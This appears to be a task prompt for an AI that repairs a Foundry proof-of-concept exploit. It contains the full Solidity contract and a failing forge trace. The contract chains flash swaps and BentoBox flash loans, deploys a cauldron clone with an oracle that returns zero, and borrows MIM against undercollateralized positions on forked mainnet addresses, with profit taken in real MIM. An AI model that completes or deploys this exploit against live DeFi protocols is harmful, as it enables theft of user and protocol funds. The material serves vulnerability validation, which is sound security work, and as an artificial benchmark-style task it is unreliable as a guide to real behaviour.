You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Zero oracle rates are accepted and make any borrower with nonzero collateral appear solvent
- claim: Neither `init()` nor `updateExchangeRate()` validates that the oracle returned success or that the returned rate is nonzero before storing or using it. If the cached `exchangeRate` becomes zero, `_isSolvent()` reduces the debt side of the solvency inequality to zero, so any account with positive collateral passes solvency checks, and `liquidate()` also stops treating those borrowers as insolvent.
- impact: During a zero-rate oracle event, users can post dust collateral, borrow out the cauldron's MIM, and remain effectively unliquidatable until a valid price is restored.
- exploit_paths: ["At initialization, `oracle.get()` can return `(false, 0)` or another zero rate and the clone stores `exchangeRate = 0` without reverting.", "Later, a user borrows through `borrow()` or `cook(ACTION_BORROW, ...)`; the post-action solvency check uses the zero cached rate, so the position is accepted despite being deeply undercollateralized."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool, uint256);
}

interface ICauldronLike {
    function bentoBox() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function isSolvent(address user) external view returns (bool);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
    function deploy(address masterContract, bytes calldata data, bool useCreate2) external payable returns (address cloneAddress);
    function masterContractOf(address cloneAddress) external view returns (address masterContract);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ZeroOracle is IOracleLike {
    function get(bytes calldata) external pure returns (bool, uint256) {
        return (false, 0);
    }
}

contract FlawVerifier is IFlashBorrowerLike {
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    ICauldronLike public constant TARGET = ICauldronLike(TARGET_CAULDRON);

    error Unauthorized();
    error SetupFailed(string reason);
    error ExecutionFailed(string reason);

    uint256 internal constant AUXILIARY_DIVISOR = 20;
    uint256 internal constant BENTO_FLASH_DIVISOR = 5;
    uint256 internal constant PAIR_RESERVE_DIVISOR = 2;

    uint256 internal _profitAmount;
    bool internal _executed;

    address public vulnerableCauldron;
    address public zeroOracle;
    address public selectedPair;
    address public selectedQuoteToken;
    address public profitReceiver;

    uint256 public flashAmount;
    uint256 public auxiliaryAmount;
    uint256 public pairRepayAmount;
    uint256 public bentoFlashFee;
    uint256 public depositedAmount;
    uint256 public depositedShare;
    uint256 public borrowedAmount;
    uint256 public borrowedPart;
    uint256 public borrowedShare;
    bool public hypothesisValidated;
    bool public usedInitZeroRatePath;
    bool public initOracleGetReturnedFalse;
    uint256 public initOracleRate;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _execute(msg.sender);
    }

    function execute() external returns (uint256) {
        return _execute(msg.sender);
    }

    function exploit() external returns (uint256) {
        return _execute(msg.sender);
    }

    function run() external returns (uint256) {
        return _execute(msg.sender);
    }

    function _execute(address receiver) internal returns (uint256) {
        if (_executed) {
            return _profitAmount;
        }
        _executed = true;
        profitReceiver = receiver;

        _deployVulnerableClone();
        _prepareApprovals();
        _selectLiquidity();

        if (flashAmount == 0 || auxiliaryAmount == 0 || selectedPair == address(0)) {
            revert SetupFailed("NO_WORKING_FLASH_CONFIGURATION");
        }

        address token0 = IUniswapV2PairLike(selectedPair).token0();
        uint256 amount0Out = token0 == MIM ? auxiliaryAmount : 0;
        uint256 amount1Out = token0 == MIM ? 0 : auxiliaryAmount;

        IUniswapV2PairLike(selectedPair).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(auxiliaryAmount, flashAmount)
        );

        _profitAmount = IERC20Like(MIM).balanceOf(address(this));
        if (_profitAmount == 0) {
            revert ExecutionFailed("NO_REALIZED_PROFIT");
        }

        _safeTransfer(MIM, receiver, _profitAmount);
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender != selectedPair || sender != address(this)) {
            revert Unauthorized();
        }

        uint256 receivedAmount = amount0 != 0 ? amount0 : amount1;
        (uint256 expectedAuxiliary, uint256 expectedFlashAmount) = abi.decode(data, (uint256, uint256));
        if (receivedAmount != expectedAuxiliary || expectedFlashAmount != flashAmount) {
            revert ExecutionFailed("PAIR_CALLBACK_MISMATCH");
        }

        pairRepayAmount = _uniswapRepayAmount(receivedAmount);

        IBentoBoxLike(TARGET.bentoBox()).flashLoan(
            this,
            address(this),
            MIM,
            flashAmount,
            abi.encode(receivedAmount)
        );

        _withdrawAllMimShares();

        if (IERC20Like(MIM).balanceOf(address(this)) < pairRepayAmount) {
            revert ExecutionFailed("INSUFFICIENT_MIM_TO_REPAY_PAIR");
        }
        _safeTransfer(MIM, selectedPair, pairRepayAmount);
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external override {
        if (msg.sender != TARGET.bentoBox() || sender != address(this) || token != MIM) {
            revert Unauthorized();
        }

        uint256 aux = abi.decode(data, (uint256));
        bentoFlashFee = fee;
        if (aux < fee) {
            revert ExecutionFailed("AUXILIARY_FLASH_TOO_SMALL");
        }

        uint256 totalDeposit = amount + aux;

        // Path anchor 1: at initialization the clone accepts a bad oracle response.
        // The clone init() reaches oracle.get() on ZeroOracle, which returns (false, 0).
        // Because init() does not validate success and stores exchangeRate = 0, the clone is born with a zero cached rate.
        // Path anchor 2: later the attacker borrow()s through cook(ACTION_BORROW, ...), after adding nonzero collateral.
        // The auxiliary public flash swap only funds the unavoidable flash-loan fee; it does not change the exploit causality.
        (, depositedShare) = IBentoBoxLike(TARGET.bentoBox()).deposit(MIM, address(this), vulnerableCauldron, totalDeposit, 0);
        depositedAmount = totalDeposit;
        if (depositedShare == 0) {
            revert ExecutionFailed("ZERO_DEPOSIT_SHARE");
        }

        uint256 borrowAmount = depositedAmount;
        if (borrowAmount > 1) {
            borrowAmount -= 1;
        }

        // This is the precise exploit stage described in the finding:
        // borrow() / cook(ACTION_BORROW, ...) / cook(action_borrow, ...) is accepted even though the position is undercollateralized,
        // because the post-action solvency check multiplies debt by exchangeRate and exchangeRate = 0.
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_ADD_COLLATERAL;
        datas[0] = abi.encode(_toInt256(depositedShare), address(this), true);

        actions[1] = ACTION_BORROW;
        datas[1] = abi.encode(_toInt256(borrowAmount), address(this));

        (borrowedPart, borrowedShare) = ICauldronLike(vulnerableCauldron).cook(actions, values, datas);
        borrowedAmount = borrowAmount;

        hypothesisValidated = _validateZeroRateBorrowPath();
        if (!hypothesisValidated) {
            revert ExecutionFailed("ZERO_RATE_SOLVENCY_BYPASS_NOT_REACHED");
        }
    }

    function _deployVulnerableClone() internal {
        if (vulnerableCauldron != address(0)) {
            return;
        }

        zeroOracle = address(new ZeroOracle());

        // Explicitly demonstrate the bad oracle semantics required by the finding.
        // This mirrors the unsafe init() path: oracle.get() returns (false, 0).
        (bool oracleSuccess, uint256 rate) = IOracleLike(zeroOracle).get(bytes(""));
        initOracleGetReturnedFalse = !oracleSuccess;
        initOracleRate = rate;
        if (oracleSuccess || rate != 0) {
            revert SetupFailed("ZERO_ORACLE_NOT_RETURNING_FALSE_ZERO");
        }

        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        address master = bento.masterContractOf(TARGET_CAULDRON);
        if (master == address(0)) {
            revert SetupFailed("MISSING_MASTER_CONTRACT");
        }

        bytes memory initData = abi.encode(
            MIM,
            zeroOracle,
            bytes(""),
            uint64(0),
            uint256(112_000),
            uint256(75_000),
            uint256(0)
        );

        vulnerableCauldron = bento.deploy(master, initData, false);
        if (vulnerableCauldron == address(0)) {
            revert SetupFailed("CLONE_DEPLOY_FAILED");
        }

        // Path anchor: init() accepted oracle.get() == (false, 0) and cached exchangeRate = 0.
        if (ICauldronLike(vulnerableCauldron).exchangeRate() != 0) {
            revert SetupFailed("INIT_DID_NOT_CACHE_ZERO_RATE");
        }

        usedInitZeroRatePath = true;
    }

    function _prepareApprovals() internal {
        _approveIfNeeded(MIM, TARGET.bentoBox(), type(uint256).max);
    }

    function _selectLiquidity() internal {
        uint256 bestReserve;
        address bestPair;
        address bestQuote;

        (bestPair, bestQuote, bestReserve) = _pickBetterPair(SUSHI_FACTORY, WETH, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(SUSHI_FACTORY, USDC, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(SUSHI_FACTORY, USDT, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(SUSHI_FACTORY, DAI, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(UNISWAP_V2_FACTORY, WETH, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(UNISWAP_V2_FACTORY, USDC, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(UNISWAP_V2_FACTORY, USDT, bestPair, bestQuote, bestReserve);
        (bestPair, bestQuote, bestReserve) = _pickBetterPair(UNISWAP_V2_FACTORY, DAI, bestPair, bestQuote, bestReserve);

        if (bestPair == address(0) || bestReserve == 0) {
            revert SetupFailed("NO_MIM_PAIR_FOUND");
        }

        uint256 bentoBalance = IERC20Like(MIM).balanceOf(TARGET.bentoBox());
        if (bentoBalance == 0) {
            revert SetupFailed("NO_BENTO_MIM_LIQUIDITY");
        }

        uint256 maxFromBento = bentoBalance / BENTO_FLASH_DIVISOR;
        uint256 maxFromPair = bestReserve / PAIR_RESERVE_DIVISOR;
        uint256 candidate = maxFromBento < maxFromPair ? maxFromBento : maxFromPair;
        if (candidate <= AUXILIARY_DIVISOR) {
            revert SetupFailed("FLASH_AMOUNT_TOO_SMALL");
        }

        selectedPair = bestPair;
        selectedQuoteToken = bestQuote;
        flashAmount = candidate;
        auxiliaryAmount = candidate / AUXILIARY_DIVISOR;
        if (auxiliaryAmount == 0) {
            auxiliaryAmount = 1;
        }
    }

    function _pickBetterPair(
        address factory,
        address otherToken,
        address currentBestPair,
        address currentBestQuote,
        uint256 currentBestReserve
    ) internal view returns (address bestPair, address bestQuote, uint256 bestReserve) {
        bestPair = currentBestPair;
        bestQuote = currentBestQuote;
        bestReserve = currentBestReserve;

        (address pair, uint256 reserve) = _pairWithReserve(factory, otherToken);
        if (reserve > bestReserve) {
            bestPair = pair;
            bestQuote = otherToken;
            bestReserve = reserve;
        }
    }

    function _pairWithReserve(address factory, address otherToken) internal view returns (address pair, uint256 mimReserve) {
        pair = IUniswapV2FactoryLike(factory).getPair(MIM, otherToken);
        if (pair == address(0)) {
            return (address(0), 0);
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == MIM) {
            mimReserve = uint256(reserve0);
        } else {
            mimReserve = uint256(reserve1);
        }
    }

    function _validateZeroRateBorrowPath() internal view returns (bool) {
        uint256 cachedExchangeRate = ICauldronLike(vulnerableCauldron).exchangeRate();
        uint256 collateralShare = ICauldronLike(vulnerableCauldron).userCollateralShare(address(this));
        uint256 debtPart = ICauldronLike(vulnerableCauldron).userBorrowPart(address(this));
        bool solvent = ICauldronLike(vulnerableCauldron).isSolvent(address(this));

        return usedInitZeroRatePath
            && initOracleGetReturnedFalse
            && initOracleRate == 0
            && cachedExchangeRate == 0
            && collateralShare > 0
            && debtPart > 0
            && solvent;
    }

    function _withdrawAllMimShares() internal {
        uint256 mimShares = IBentoBoxLike(TARGET.bentoBox()).balanceOf(MIM, address(this));
        if (mimShares != 0) {
            IBentoBoxLike(TARGET.bentoBox()).withdraw(MIM, address(this), address(this), 0, mimShares);
        }
    }

    function _approveIfNeeded(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowed) {
            if (allowed >= amount / 2) {
                return;
            }
        } catch {}

        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ExecutionFailed("APPROVE_FAILED");
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) {
            revert ExecutionFailed("TRANSFER_FAILED");
        }
    }

    function _toInt256(uint256 value) internal pure returns (int256 signed) {
        if (value > uint256(type(int256).max)) {
            revert ExecutionFailed("INT256_OVERFLOW");
        }
        signed = int256(value);
    }

    function _uniswapRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }
}

```

forge stdout (tail):
```
0420022 [7.947e21], 0x0000000000000000000000000000000000000000000000158aa5ed2de64d1949)
    │   │   │   │   ├─ [5883] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 7947445553553700420022 [7.947e21])
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000d96f48665a1410c0cd669a88898eca36b9fc2cce
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000001aed4f68795fe05f9b6
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [112826] FlawVerifier::onFlashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3, 7947445553553700420022 [7.947e21], 3973722776776850210 [3.973e18], 0x0000000000000000000000000000000000000000000000158aa5ed2de64d1949)
    │   │   │   │   │   ├─ [416] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::bentoBox() [staticcall]
    │   │   │   │   │   │   ├─ [250] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::bentoBox() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce
    │   │   │   │   │   │   └─ ← [Return] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce
    │   │   │   │   │   ├─ [416] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::bentoBox() [staticcall]
    │   │   │   │   │   │   ├─ [250] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::bentoBox() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce
    │   │   │   │   │   │   └─ ← [Return] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce
    │   │   │   │   │   ├─ [37102] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce::deposit(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x02744DCE8D6fBA262f08034905Ba0ce42Ed10B38, 8344817831231385441023 [8.344e21], 0)
    │   │   │   │   │   │   ├─ [3467] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce, 8344817831231385441023 [8.344e21])
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000d96f48665a1410c0cd669a88898eca36b9fc2cce
    │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000001c45f9c74c3e45312ff
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   ├─  emit topic 0: 0xb2346165e782564f17f5b7e555c21f4fd96fbc93458572bf0113ea35a958fc55
    │   │   │   │   │   │   │        topic 1: 0x00000000000000000000000099d8a9c45b2eca8864373a26d1459e3dff1e17f3
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │        topic 3: 0x00000000000000000000000002744dce8d6fba262f08034905ba0ce42ed10b38
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000001c45f9c74c3e45312ff0000000000000000000000000000000000000000000001c45ef2b68a8ba77557
    │   │   │   │   │   │   └─ ← [Return] 8344817831231385441023 [8.344e21], 8344770052806811284823 [8.344e21]
    │   │   │   │   │   ├─ [2943] 0x02744DCE8D6fBA262f08034905Ba0ce42Ed10B38::cook([10, 5], [0, 0], [0x0000000000000000000000000000000000000000000001c45ef2b68a8ba775570000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000001c45f9c74c3e45312fe0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f])
    │   │   │   │   │   │   ├─ [2667] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::cook([10, 5], [0, 0], [0x0000000000000000000000000000000000000000000001c45ef2b68a8ba775570000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000001c45f9c74c3e45312fe0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f]) [delegatecall]
    │   │   │   │   │   │   │   ├─ [226] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::4b820093(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3
  at 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103.cook
  at 0x02744DCE8D6fBA262f08034905Ba0ce42Ed10B38.cook
  at FlawVerifier.onFlashLoan
  at 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce.flashLoan
  at FlawVerifier.uniswapV2Call
  at 0x07D5695a24904CC1B6e3bd57cC7780B90618e3c4.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.64s (1.51s CPU time)

Ran 1 test suite in 1.75s (1.64s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 870828)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
